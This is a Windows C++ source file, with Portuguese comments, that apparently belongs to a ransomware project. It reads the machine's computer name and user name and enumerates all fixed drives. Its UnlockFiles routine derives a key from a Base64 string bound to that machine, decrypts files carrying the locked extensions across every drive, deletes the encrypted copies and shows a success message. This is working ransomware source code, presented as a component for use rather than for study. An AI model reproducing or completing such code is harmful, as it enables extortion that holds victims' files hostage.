#pragma warning (disable : 4996) // Desativa o aviso 4996 do compilador
#pragma comment(lib,"ws2_32.lib") // Link com a winsock library com pragma

// Inclusões de livrarias
#include "config.h"
#include "GeneralOperations.h"
#include "FileOperations.h"
#include "Crypt.h"

// Função com retorno do tipo string
std::string GeneralOperations::ComputerName() {
	char computerName[MAX_COMPUTERNAME_LENGTH + 1]; // Declarar variavel com o tamanho disponivel no buffer que é 15 + 1 para o caracter nulo final (null terminator character)
	DWORD size = sizeof(computerName) / sizeof(computerName[0]);  // Indica no input o tamanho do buffer em TCHAR's e no output indica o número de TCHAR's copiados para o buffer destino sem incluir o caracter nulo final (null terminator character)

	GetComputerNameA(computerName, &size); // Devolve o nome do computador
	return std::string(computerName); // Função retorna o nome do computador
}

// Função com retorno do tipo string
std::string GeneralOperations::Username() {
	char computerUsername[UNLEN + 1]; // Declarar variavel com o tamanho disponivel no buffer que é 256 + 1 para o caracter nulo final (null terminator character)
	DWORD size = sizeof(computerUsername) / sizeof(computerUsername[0]); // Indica no input o tamanho do buffer em TCHAR's e no output indica o número de TCHAR's copiados para o buffer destino sem incluir o caracter nulo final (null terminator character)

	GetUserNameA(computerUsername, &size); // Devolve o nome do utilizador
	return std::string(computerUsername); // Função retorna o nome do utilizador com sessão iniciada
}

void GeneralOperations::GetHardDiskDrivesNames(std::vector<std::string>& strIPAddresses) {
	DWORD dwBufferSize = GetLogicalDriveStrings(0, NULL);
	char* pDrives = (char*)malloc(dwBufferSize + 1);
	char* pDrivesToDelete = pDrives;
	if (pDrives != NULL) {
		GetLogicalDriveStrings(dwBufferSize, pDrives);
		while (*pDrives) {
			UINT nDriveType = GetDriveType(pDrives);

			if (DRIVE_FIXED == nDriveType) {
				strIPAddresses.push_back(pDrives);
			}
			pDrives += lstrlen(pDrives) + 1;
		}

		free(pDrivesToDelete);

		pDrivesToDelete = NULL;
	}
}

void GeneralOperations::UnlockFiles(std::string const& key) {
	config::init();
	if (key.length() == 0) {
		MessageBoxW(NULL, UNSUCCESSFUL_MESSAGE, L"", MB_OK);
		return;
	}

	auto keyData = Crypt::Base64Decode(key);
	auto computerInfo = GeneralOperations::ComputerName() + GeneralOperations::Username();
	keyData = Crypt::XOR(keyData.substr(computerInfo.size()));

	std::vector<std::string> hddDriveNames;
	GeneralOperations::GetHardDiskDrivesNames(hddDriveNames);
	Crypt cryptOperation;

	for (size_t i = 0; i < hddDriveNames.size(); i++) {
		std::string drive = hddDriveNames.at(i);
		std::string fullPath = drive + SEARCH_PATH;
		FileOperations::SetDirectory(fullPath);

		std::vector<std::string> files;
		FileOperations::SearchDirectory(files, FileOperations::GetDirectory(), config::DECRPYTION_EXTENSIONS, true);

		auto end = files.end();
		for (auto it = files.begin(); it != end; ++it) {
			std::string newFileName = (*it).substr(0, (*it).length() - 4);
			cryptOperation.UnlockFile(const_cast<char*>((*it).c_str()), const_cast<char*>(newFileName.c_str()), const_cast<char*>(keyData.c_str()));
			remove(const_cast<char*>((*it).c_str()));
		}
	}

	MessageBoxW(NULL, SUCCESS_MESSAGE, L"", MB_OK);
	PostQuitMessage(0);
}